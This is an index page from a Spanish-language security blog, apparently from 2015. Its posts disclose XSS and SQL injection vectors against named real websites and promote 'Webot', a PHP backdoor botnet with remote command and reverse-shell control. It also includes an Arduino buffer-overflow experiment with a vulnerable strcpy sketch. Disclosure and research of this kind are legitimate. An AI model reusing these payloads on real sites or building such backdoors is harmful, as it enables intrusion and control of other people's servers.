
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Security Signal</title>
  <meta name="author" content="q3rv0 - hdbreaker">

  
  <meta name="description" content="Todos los sitios expuestos en esta sección han sido reportados y hemos ofrecido nuestro servicios para lograr solucionar las fallas de seguridad en &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://securitysignal.github.io/posts/2/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
  <link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div id="logo">
  	<div id="logoLeft">{</div>
  	<div id="logoText">sihugh</div>
  	<div id="logoRight">}</div>
  	<div class="clear"></div>
  </div>
  <h1><a href="/">Security Signal</a></h1>
  
    <h2>Looking for signs of insecurity...</h2>
  
  <div class="clear"></div>
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:securitysignal.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/04/18/xss-httpswwwclickoncomar/">XSS https://www.clickon.com.ar</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-04-18T17:02:00-07:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-fiqKeorE6V0/VTLwdPIh2qI/AAAAAAAAAeQ/l-FfqBNK_X0/s1600/clickONXSS.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-fiqKeorE6V0/VTLwdPIh2qI/AAAAAAAAAeQ/l-FfqBNK_X0/s1600/clickONXSS.png" height="358" width="640" /></a></div><br /></div><br />Todos los sitios expuestos en esta sección han sido reportados y  hemos ofrecido nuestro servicios para lograr solucionar las fallas de  seguridad en sus sistemas,<br /><a name='more'></a> si estos fallos siguen vigentes es por puro  desinterés y mala administración de los encargados. <br /><br />XSS Double Encode<br /><br />Sitio: <a href="https://www.clickon.com.ar/">https://www.clickon.com.ar</a><br /><br />Vector:<br /><br /><a href="https://www.clickon.com.ar/busca/%253Cscript%253Ealert%2528%2527hdbreaker%2527%2529%253C%252fscript%253E?searchByCity=1&amp;showQuery=1&amp;searchFrom=box">https://www.clickon.com.ar/busca/%253Cscript%253Ealert%2528%2527hdbreaker%2527%2529%253C%252fscript%253E?searchByCity=1&amp;showQuery=1&amp;searchFrom=box</a></div><div style="text-align: left;"><br />Autor: hdbreaker</div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/04/17/sqli-httpwwwisecomcomar/">SQLI http://www.isecom.com.ar</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-04-17T12:53:00-07:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div style="text-align: left;"><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-1lzWi5eus9k/VTFkJBY1X5I/AAAAAAAAAd8/dJzRXKlQfDc/s1600/isecom.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-1lzWi5eus9k/VTFkJBY1X5I/AAAAAAAAAd8/dJzRXKlQfDc/s1600/isecom.png" height="356" width="640" /></a></div><br /></div><br />Todos los sitios expuestos en esta sección han sido reportados y  hemos ofrecido nuestro servicios para lograr solucionar las fallas de  seguridad en sus sistemas,<br /><a name='more'></a> si estos fallos siguen vigentes es por puro  desinterés y mala administración de los encargados. <br /><br />SQLI<br /><br />Sitio: <a href="http://www.isecom.com.ar/noticias_int.php?id=%2752">http://www.isecom.com.ar/noticias_int.php?id='52</a><a href="https://www.bebee.com/"></a></div><div style="text-align: left;"><br />Autor: hdbreaker<br /><br />Este  fallo fue reportado sin respuesta por parte de la empresa, fueron  informados varias veces y no se han tomado la molestia de responder ningún  correo lo que deja que hablar de los desarrolladores del sistema al no interesarse por corregir un fallo que pone en riesgo los datos privados de las empresas que confían en su sistema.</div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/04/17/xss-wwwbebeecom/">XSS www.bebee.com</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-04-17T12:48:00-07:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/--5xw8Lria04/VTFjg5UvCUI/AAAAAAAAAd0/pGbYGeadc4Y/s1600/xssbeBee.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/--5xw8Lria04/VTFjg5UvCUI/AAAAAAAAAd0/pGbYGeadc4Y/s1600/xssbeBee.png" height="358" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Todos los sitios expuestos en esta sección han sido reportados y  hemos ofrecido nuestro servicios para lograr solucionar las fallas de  seguridad en sus sistemas,<br /><a name='more'></a> si estos fallos siguen vigentes es por puro  desinterés y mala administración de los encargados. <br /><br />XSS<br /><br />Sitio: <a href="https://www.bebee.com/">https://www.bebee.com/</a><a href="http://www.icbc.com.ar/"></a><br /><br />Vector: <br />Searcher: &lt;script&gt;alert('hdbreaker')&lt;/script&gt;</div><div style="text-align: left;"><br />Autor: hdbreaker<br /><br />Este fallo fue reportado sin respuesta por parte de la empresa, fueron informados 3 veces y no se han tomado la molestia de responder ningún correo lo que deja que hablar de los desarrolladores del sistema. Doy por positivo que el fallo a sido fixeado (Por fin)</div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/04/08/webot-release/">Webot Release!</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-04-08T09:03:00-07:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://www.techweekeurope.co.uk/wp-content/uploads/2011/06/Botnet.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.brightwings.co.nz/wp-content/uploads/2012/04/butterfly-release.jpg" height="244" width="400" /></a> </div><div style="text-align: right;"><b>by hdbreaker</b> </div><div style="text-align: left;"></div><br /><div style="text-align: left;"><div style="text-align: center;"><h2><b><span class="st">¡</span>Webot Release!</b></h2></div></div><div style="text-align: center;">Por fin después de varios meses de testing hemos logrado terminar una versión</div><div style="text-align: center;">estable de Webot y la hemos incluido de forma <br /><a name='more'></a>OpenSource en nuestro repositorio de frameshock!</div><br /><b>Si quieres ver algo crecer, déjalo ser libre</b><br /><div style="text-align: center;"><h2>¿Como Funciona?</h2></div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><b>Webot</b> da la posibilidad de crear un payload especial protegido por contraseña que debe inyectarse en cualquier archivo php dentro del servidor.</div><div style="text-align: left;"><br />Este payload funciona de forma OnDemand, lo que quiere decir que cuando el titiritero solicite al Zombie privilegios este le responderá, pero mientras no sea necesario el Zombie no despertara ninguna actitud sospechosa quedando dormido pero residente.<br /><br />Una vez hecho esto solo queda gestionar los Zombies desde el modulo <b>Webot</b> de <b>Frameshock</b> que permite el envío individual o masivo de comando a los Zombies. <br /><br />Ademas de esto <b>Webot</b> ofrece la posibilidad de solicitar un Reverse Shell a los Zombies, tanto a un Bot especifico como a toda la Mesh de Bots.<br /><br /></div><div style="text-align: left;"></div><div style="text-align: left;"><div style="text-align: center;"><br /><a href="http://3.bp.blogspot.com/-vujy0UM7q6Q/VPe_jN7XrlI/AAAAAAAAAbU/H5LE6suMWH4/s1600/main.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-vujy0UM7q6Q/VPe_jN7XrlI/AAAAAAAAAbU/H5LE6suMWH4/s1600/main.png" height="275" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-j-ryWknopgA/VPe_ieu9rcI/AAAAAAAAAbA/EpeEic0KcCk/s1600/cmd.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-j-ryWknopgA/VPe_ieu9rcI/AAAAAAAAAbA/EpeEic0KcCk/s1600/cmd.png" height="265" width="640" /></a></div></div><div style="text-align: center;"><a href="http://3.bp.blogspot.com/-lom6f5K_KoI/VPe_ijafRlI/AAAAAAAAAbI/d4XQ2k4eVG4/s1600/generate.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-lom6f5K_KoI/VPe_ijafRlI/AAAAAAAAAbI/d4XQ2k4eVG4/s1600/generate.png" height="288" width="640" /></a></div><div style="text-align: left;"></div><div style="text-align: left;"><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-lwPsAijUq0A/VPe_iNIRn8I/AAAAAAAAAa4/QGD8jh15Z8w/s1600/bot.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-lwPsAijUq0A/VPe_iNIRn8I/AAAAAAAAAa4/QGD8jh15Z8w/s1600/bot.png" height="128" width="640" /></a><a href="http://1.bp.blogspot.com/-o7Zrd3ovDIk/VPe_icBgcxI/AAAAAAAAAa8/fuRHMeFGsBs/s1600/exploit.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-o7Zrd3ovDIk/VPe_icBgcxI/AAAAAAAAAa8/fuRHMeFGsBs/s1600/exploit.png" height="116" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-p1q-t53dSlc/VPe_ixw5-QI/AAAAAAAAAbM/_eRbrlUEwek/s1600/handler.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-p1q-t53dSlc/VPe_ixw5-QI/AAAAAAAAAbM/_eRbrlUEwek/s1600/handler.png" height="435" width="640" /></a></div><br /><br /><br /><br /><br /><br /></div></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/03/04/webot-one-ring-to-control-others/">Webot - One Ring to Control the Others</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-03-04T18:32:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://www.techweekeurope.co.uk/wp-content/uploads/2011/06/Botnet.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.techweekeurope.co.uk/wp-content/uploads/2011/06/Botnet.jpg" height="353" width="400" /></a> </div><div style="text-align: right;"><b>by hdbreaker</b> </div><div style="text-align: left;"></div><div style="text-align: left;">Alguna vez has pensado como armar tu propia Botnet?&nbsp;</div><div style="text-align: left;">Repasado internamente la planificación para dispersar Malware? <br /><a name='more'></a><br />Has pensado en armar tu propio Malware?<br /><br />Las miles de lineas de código que implica tener un Malware decente?&nbsp;</div><div style="text-align: left;">Has pensado si cuentas realmente con las skills necesarias?</div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><br />Bueno quiero comentarles un secreto a esas personas curiosas que probablemente tengan un perfil Pentester&nbsp; y no se sientan atraídas por el Malware o no ven el desarrollo de software como parte principal de sus intereses.<br /><br /><div style="text-align: center;"><h2><b>Estamos trabajando en una solución</b></h2></div></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Imagina ir realizando tus ataques, ingresando a servidores recorriendo archivos leyendo logs, intentando escalar privilegios y te encuentras con la necesidad&nbsp; de mantener el acceso de forma fiable y pasiva.</div><div style="text-align: left;"><b>Webot</b> es posible gracias a la base robusta que brinda Frameshock, se presenta como un modulo privado del mismo y viene a realizar esos deseos realidad.</div><div style="text-align: left;"></div><div style="text-align: left;">Podrás realizar tus auditorías y a medida que trabajes podrás generarte poco a poco una botnet PHP pasiva que en el momento que tu elijas te daría la posibilidad de volver activa a cada victima LINUX, gestionarla remotamente o en conjunto con todos tus zombies y hasta garantizarte reverse shell de todas tus victimas.</div><div style="text-align: left;"><br /></div><div style="text-align: center;"><h2>¿Como Funciona?</h2></div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><b>Webot</b> da la posibilidad de crear un payload especial protegido por contraseña que debe inyectarse en cualquier archivo php dentro del servidor.</div><div style="text-align: left;"><br />Este payload funciona de forma OnDemand, lo que quiere decir que cuando el titiritero solicite al Zombie privilegios este le responderá, pero mientras no sea necesario el Zombie no despertara ninguna actitud sospechosa quedando dormido pero residente.<br /><br />Una vez hecho esto solo queda gestionar los Zombies desde el modulo <b>Webot</b> de <b>Frameshock</b> que permite el envío individual o masivo de comando a los Zombies. <br /><br />Ademas de esto <b>Webot</b> ofrece la posibilidad de solicitar un Reverse Shell a los Zombies, tanto a un Bot especifico como a toda la Mesh de Bots.<br /><br />Este modulo se encuentra en desarrollo privado y se esta debatiendo la posibilidad de liberar una versión gratuita.<br /><br />De momentos los dejamos con unas capturas:</div><div style="text-align: left;"></div><div style="text-align: left;"><div style="text-align: center;"><br /><a href="http://3.bp.blogspot.com/-vujy0UM7q6Q/VPe_jN7XrlI/AAAAAAAAAbU/H5LE6suMWH4/s1600/main.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-vujy0UM7q6Q/VPe_jN7XrlI/AAAAAAAAAbU/H5LE6suMWH4/s1600/main.png" height="275" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-j-ryWknopgA/VPe_ieu9rcI/AAAAAAAAAbA/EpeEic0KcCk/s1600/cmd.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-j-ryWknopgA/VPe_ieu9rcI/AAAAAAAAAbA/EpeEic0KcCk/s1600/cmd.png" height="265" width="640" /></a></div></div><div style="text-align: center;"><a href="http://3.bp.blogspot.com/-lom6f5K_KoI/VPe_ijafRlI/AAAAAAAAAbI/d4XQ2k4eVG4/s1600/generate.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-lom6f5K_KoI/VPe_ijafRlI/AAAAAAAAAbI/d4XQ2k4eVG4/s1600/generate.png" height="288" width="640" /></a></div><div style="text-align: left;"></div><div style="text-align: left;"><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-lwPsAijUq0A/VPe_iNIRn8I/AAAAAAAAAa4/QGD8jh15Z8w/s1600/bot.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-lwPsAijUq0A/VPe_iNIRn8I/AAAAAAAAAa4/QGD8jh15Z8w/s1600/bot.png" height="128" width="640" /></a><a href="http://1.bp.blogspot.com/-o7Zrd3ovDIk/VPe_icBgcxI/AAAAAAAAAa8/fuRHMeFGsBs/s1600/exploit.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-o7Zrd3ovDIk/VPe_icBgcxI/AAAAAAAAAa8/fuRHMeFGsBs/s1600/exploit.png" height="116" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-p1q-t53dSlc/VPe_ixw5-QI/AAAAAAAAAbM/_eRbrlUEwek/s1600/handler.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-p1q-t53dSlc/VPe_ixw5-QI/AAAAAAAAAbM/_eRbrlUEwek/s1600/handler.png" height="435" width="640" /></a></div><br /><br /><br /><br /><br /><br /></div></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/02/26/arduino-p0wned-desbordando-arduino/">Arduino P0wn3d - Desbordando Arduino</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-02-26T23:04:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://sd.keepcalm-o-matic.co.uk/i/keep-calm-and-fuck-arduino.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://sd.keepcalm-o-matic.co.uk/i/keep-calm-and-fuck-arduino.png" height="400" width="342" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: right;"><br /></div><div style="text-align: left;">Hace bastante tiempo que con mi amigo Q3rv0 estamos estudiando a fondo los renombrados Buffer Overflow en distintas arquitecturas.<br /><a name='more'></a><br />En una charla a altas horas de la noche salio la incognita...&nbsp;</div><h2 style="text-align: center;">¿¿¿Se podra Overflodear un Arduino???</h2><div style="text-align: left;"><br />La verdad fue un gran interrogante. Como gran aficionado a la electrónica y habiendo trabajando desarrollando varios sistemas telemétricos industriales bajo la misma plataforma, no podía faltar en mi colección varios de estos increíbles aparatitos.<br /><br />El problema era el siguiente... como funciona internamente el procesador de un Arduino?<br /><br />Antes de empezar a probar decidí estudiar un poco mas en profundidad la arquitectura Harvard, en la cual se basan la mayoría de los sistemas embebidos PIC y derivados centrados en Atmel AVR.<br /><br />Lo primero a destacar de la arquitectura Harvard es que a diferencia de arquitecturas como x86 y x64, Harvard tiene 2 espacios de memoria separados, los cuales gestionan partes distintas del procesador, un sector se encarga de gestionar la sección ejecutable o de código y otra, la sección de datos no ejecutables, donde se almacenan las funcionalidades especiales del integrado donde se almacena el firmware principal o bootloader del micro controlador lo que equivaldría a root en un sistema linux!<br /><br /><div style="text-align: center;"><span style="color: red;">EXECUTABLE SPACE</span> &lt;-------------&gt; <b>CPU ATMEL</b> &lt;-------------&gt; <span style="color: red;">DATA SPACE</span></div><br />El CPU ATMEL tiene la habilidad de poder interactuar con ambos espacios de memoria a la vez y en base a las direcciones en el DATA SPACE gestionar los saltos de memoria en el EXECUTABLE SPACE (CODE SPACE)<br /><br />La idea principal era de alguna forma lograr explotar una función que no validara el largo de los buffer y de esta forma poder pisar la memoria reservada en el stack hasta sobre escribir el EIP y lograr modificar el salto del procesador a una nueva dirección de memoria donde esconderíamos algún código malicioso que se ejecutara a nivel bootloader y de esta forma conseguir nuestro "pseudo root" y lograr acceder a la habilidad de retrogravación que poseen los Arduino e intentar cargar un bootloader modificado que guardara a escondidas los valores de distintos sensores y los enviara a un servidor ftp o los escribiera en algún archivo que luego el atacante obtendría por sus propios medios.<br /><br />Lo primero a solucionar... <b>la funcion que no validara el largo de los buffer... </b>La verdad esto no fue muy dificil, ya que Arduino se basa en C para trabajar podemos utilizar la función <b>strcpy</b> sin sanitizar para lograr overflodear el stack y así lograr pisar el EIP.<br /><br />Para realizar mis pruebas realice un pequeño sketch que me permitiera analizar de forma controlada las distintas respuestas que podía observar en Arduino. <br /><br />Sketch:<br /><br /><pre class="brush: cpp">int led = 13;<br /><br />//Buffer to be Smashed<br />char bufferOUT[1];<br /><br />//Buffer Payload<br />char bufferIN[5];<br />  <br />void setup() {<br />  Serial.begin(9600);<br />  pinMode(led,OUTPUT);<br />}<br /><br />void loop() {<br />  <br />   Serial.readBytes(bufferIN, 5);<br />   // MAGIC HERE<br />   strcpy(bufferOUT,  bufferIN);<br />   // MAGIC END<br />   <br />   Serial.print(bufferOUT);<br />  <br />   //LED BLINK<br />   digitalWrite(led, HIGH);<br />   delay(500);<br />   digitalWrite(led, LOW);<br />   delay(500);<br />}<br /></pre><br /><br />Como no encontré forma de debuggear Arduino de forma remota y lograr ver que sucedía en sus llamadas a memoria me vi en la obligación de interpretar las salidas físicas que me dictaba Arduino y sacar conjeturas para saber si iba por el camino correcto.<br /><b><br />Me valí de dos grandes factores para esto:</b><br /><br />En el loop inifito de Arduino cree un simple script que hiciera parpadear un LED de forma intermitente con una diferencia de medio segundo.<br /><br />Dentro del loop agregué una llamada a la función Serial que me permitiera leer un valor ingresado por teclado del largo que yo quisiera con el fin de simular un sensor, de esta forma lograr controlar el flujo de memoria del buffer de datos enviados y lograr sobre escribir el EIP con la ayuda de <b>strcpy</b>.<br /><div style="text-align: center;"><h2><b>¿El resultado esperado?</b></h2><div style="text-align: left;"><br />Ya que no encontré forma de depurar el proceso en ejecución dentro del Atmel decidí basarme en mis conocimientos en las arquitecturas x86 y x64 y llegue a la siguiente conclusión:<br /><br /><i><b>"</b>... El procesador Atmel en algún punto realiza un PUSH con la dirección de memoria para iniciar la función que enciende el LED luego un RET donde carga el valor del siguiente salto memoria en el EIP para llamar a la función que apaga el LED, y posterior mente un POP para eliminar de la pila (stack) la función ya ejecutada para realizar el mismo proceso con la función de apagado en el loop principal</i> ...<b>"</b><br /><br />Si lograba pisar el EIP al momento de desbordar el buffer el EIP no sabría a donde saltar por lo que el programa en ejecución en Arduino colapsaría y al quedar huerfano dejaría de prender y apagar el LED.<br /><br /><b>bufferOUT[1]</b> seria el espacio reservado ínfimo en el stack que intentaría desbordar.<br /><br /><b>bufferIN[5] </b>seria mi long payload ingresado por Serial.<br /><br /><b>strcpy</b> seria el <b>CÓMPLICE</b>, la función encargada de copiar sin ningún control nuestro long payload dentro de nuestro mini buffer reservado y de esta forma lograr, con el payload correcto, destrozar el EIP.<br /><br />En este punto la incertidumbre era extrema toda la teoría indicaba que gracias al sistema de fragmentación de memoria que posee la arquitectura Hardvard seria casi imposible explotar un Buffer Overflow... sin más remedio me acomode los pantalones, me dije de aquí en adelante no hay vuelta atrás y presione el ENTER!<br /><br />Luego de algunos segundos y luego del gran parpadeo del led azul que indicaba los RX recibidos por el Arduino, justo en el momento en que el payload termino su carga, el RX azul dejo de parpadear y casi de una forma increíble para mis espectativas el <b>LED ROJO EN EL PIN 13 DEJO DE PARPADEAR!!!</b>Esto realmente era increible para mi, no pensé que esto fuera posible, de forma exitosa había logrado sobre escribir el EIP en la arquitectura HARDVARD y el arduino había quedado colapsado.<br /><br />Esto es interesante... por que es el punto de inflexión entre el EXECUTABLE SPACE Y EL DATA SPACE ya que strcpy se ejecuta del lado de EXECUTABLE SPACE, pero el EIP que regula los saltos es controlado por el DATA SPACE...<br /><br />En pocas palabras había logrado pisar un bloque de memoria fuera de mi alcance que se encontraba protegido en DATA SPACE por la arquitectura HARVARD.<br /><br />Esto pasa por que en algún momento el <b>CPU</b> debe comunicar las direcciones de memoria de la sección ejecutable sin sanitizar a la sección de datos permitiendo de alguna forma pisar los datos privativos de la sección protegida.<br /><br />La única forma de que el equipo volviera a responder fue reiniciarlo y que el bootloader se encargara de volver a cagar en la sección ejecutable el sketch.<br /><div style="text-align: center;"><h2>Bootloader el root del Atmel/PIC</h2><div style="text-align: left;"><br />Era el momento donde debía intentar ejecutar como "BOOTLOADER" alguna función utilizando la sobre escritura del EIP.<br /><br />Mi Shellcode se trataba de un código especial que realizaría un print en Serial comunicandome si tenia acceso a clases especiales heredadas para intentar lograr realizar una especie de reflections (java) y lograr ejecutar funciones privativas de bootloader.<br /><br />La estructura del Payload era la siguiente:<br /><br />NewEIP + SHELLC0DE<br /><br />Tristemente luego de muchisimos intentos y mucha lectura entendí lo que estaba pasando y por lo cual esta arquitectura es tan segura...<br /><br />El CPU Harvard permite interactuar con un sector del stack DATA SPACE que solo permite modificar memorias y punteros en relación al EXECUTABLE SPACE, por lo que todo lo demás que venia pegado al NewEIP era marcado con el byte non-exec y pasado por alto en el DATA SPACE.<br /><br />Por lo que nunca iba a poder lograr escalar privilegios a bootloader.</div><div style="text-align: center;"><h2>Conclución</h2></div><div style="text-align: center;"><b><br />Luego de entristecerme un tiempo una luz se encendió dentro mio...</b></div><div style="text-align: left;"><b><br /></b>No era posible ejecutar comandos dentro del DATA SPACE, pero era capaz de modificar el flujo de ejecución dentro del EXECUTABLE SPACE, por lo que era capaz de matar a un Arduino al dejar el EIP huerfano y además... era capas de llamar por medio del EIP y conociendo el memory address a cualquier otra función definida en el código ya que todos los saltos de memoria se encontrarían dentro del EXECUTABLE SPACE.<br /><br />Imaginemos que en nuestro sketch tenemos 2 funciones que habilitan o cierran la valvula de gas de un horno industrial y en base a una lectura de un sensor o un input Serial de algún tipo este valor decide que es mejor para el horno industrial si apagarse o arder.<br /><br /><br />void abrirGas(){ //Direccion de memoria 0xde04beff<br />&nbsp;&nbsp; //Abrir valvula de gas<br />}<br /><br />void cerrarGas(){ //Direccion de memoria 0xde12baff<br />&nbsp; //Cerrar valvula de gas<br />}<br /><br />Conociendo las posiciones de memoria de ambas funciones nosotros podriamos sobre escribir el EIP y lograr que el loop del Arduino siempre salte a la función <b>abrirGas() </b>lo que se reflejaría en una industria un probable incendio.<br /><br />En esta entrada no mostrare el PoC funcional sobre esto ya que el fin de esta entrada no es enseñar a romper sistemas embebidos sino demostrar que el <b>Internet of the Things</b> es un mundo increíble pero también abre un nuevo mundo para los ataques informáticos.<br /><br />Sin mas me despido pidiendo a todos los desarrolladores IoT que utilicen plataformas HARVARD que antes de publicar o vender un proyecto corroboren la correcta sanitización de las entradas analógicas y las entradas Seriales, ya que en un mundo donde todo se esta empezando a regir por sensores una falla nuestra como programadores puede costarle la vida a alguien, por lo menos en ambientes industriales.<br /><br />Les dejo el vídeo de como mato el proceso corriendo en Arduino explotando con éxito un Buffer Overflow en el sketch de esta publicación:</div><div style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: center;"><iframe allowfullscreen="" class="YOUTUBE-iframe-video" data-thumbnail-src="https://i.ytimg.com/vi/l02cX3TzTJw/0.jpg" frameborder="0" height="266" src="http://www.youtube.com/embed/l02cX3TzTJw?feature=player_embedded" width="320"></iframe></div></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">En el vídeo se muestra como al enviar 5 caracteres que son leidos por bufferIN, sobre escribo gracias a strcpy bufferOUT y logro pisar el EIP dejando huerfano el proceso por lo que el led rojo deja de parpadear.<br /><br />Espero que les haya parecido interesante esta investigación personal y despierte la curiosidad en todos los lectores!</div><div style="text-align: right;">Saludos!</div></div></div></div></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/02/26/enfoqueseguro-frameshock/">Enfoqueseguro - Frameshock</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-02-26T06:00:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-GeJfQFRws4o/VO8jz1FQygI/AAAAAAAAAaQ/m5Pnt0y7Goc/s1600/logoenfoque.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-GeJfQFRws4o/VO8jz1FQygI/AAAAAAAAAaQ/m5Pnt0y7Goc/s1600/logoenfoque.png" height="320" width="320" /></a></div><div style="text-align: left;"><div style="text-align: right;"><b>by hdbreaker</b> </div><br />Hoy, día de mi cumpleaños tuve el gusto de ser entrevistado por un miembro de este importante sitio de seguridad informática: <a href="http://www.enfoqueseguro.com/">www.enfoqueseguro.com</a><br /><a name='more'></a><br />El mismo se encuentra encabezado por <span class="_5yl5" data-reactid=".64.$mid=11424925504634=2171a43b2920a76aa78.2:0.0.0.0.0"><span data-reactid=".64.$mid=11424925504634=2171a43b2920a76aa78.2:0.0.0.0.0.0">Rafael Nuñez y trata toda diversidad de temas relacionados a la seguridad informatica en el mismo.<br /><br />En la entrevista se me realzaron a trasnoche varias preguntas sobre el desarrollo de Frameshock y su futuro.<br /><br />Quiero agradecer a mi gran amigo Q3rv0 que siempre ha estado para darme una mano y afrontar todo tipo de proyectos juntos y a todos los usuarios que apoyan el software libre, a todos aquellos que han reportado fallos, desarrollado módulos y colaborado de cualquier forma con la 